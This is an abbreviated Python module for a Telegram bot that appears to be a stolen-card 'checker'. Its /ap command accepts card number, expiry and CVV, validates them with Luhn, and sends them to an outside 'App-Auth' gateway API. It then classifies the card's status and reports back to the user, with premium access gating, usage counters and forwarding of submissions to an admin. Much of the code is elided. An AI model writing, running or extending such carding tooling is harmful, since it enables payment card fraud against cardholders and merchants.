...
def categorize_app_auth_response(api_response):
    """Categorize App-Auth API response"""
    try:
...
def format_app_auth_response(card_info, response_message, suffix, bin_info, execution_time, category):
    """Format App-Auth API response for Telegram"""
...
class AppAuthGateway:
    def __init__(self):
        self.base_url = "https://onyxenvbot.up.railway.app/app-auth/key=yashikaaa/cc="

    async def check_card(self, card, month, year, cvv):
        """Main function to check card through App-Auth API"""
...
def setup(app: Client):
    ...
    @app.on_message(filters.command(["ap"], prefixes=[".", "/", "!", "$"]))
    async def ap_command(client, message):
        """Handle /ap command"""
        ...
        can_access, reason = await check_gateway_access(user_id, 'ap')
        if not can_access:
            if reason == "locked":
                return
            elif reason == "premium":
...
<a href='tg://user?id={user_id}'>╰┈➤</a> 𝙁𝙤𝙧𝙢𝙖𝙩 -» /ap cc|month|year|cvc"""
        ...
        if not await validate_card_with_luhn(card_info, "App-Auth API", message):
            return
        
        card, month, year, cvv = card_info
        
        # Forward to admin if enabled
        await forward_to_admin_if_enabled(client, message, 'ap')
        
        # Send progress message
        progress_msg = await message.reply_text("𝙋𝙡𝙚𝙖𝙨𝙚 𝙒𝙖𝙞𝙩...")
        
        # Process the card using AppAuth Gateway
        gateway = AppAuthGateway()
        api_response, error, execution_time = await gateway.check_card(card, month, year, cvv)
        
        # Increment check counter
        db.increment_check(user_id, 'ap')
        ...
        if error:
            ...
            response_text = format_app_auth_response(
            ...
            # Parse API response
            category, response_message, suffix = categorize_app_auth_response(api_response)
    ...
    print("✅ App-Auth Gateway commands registered")
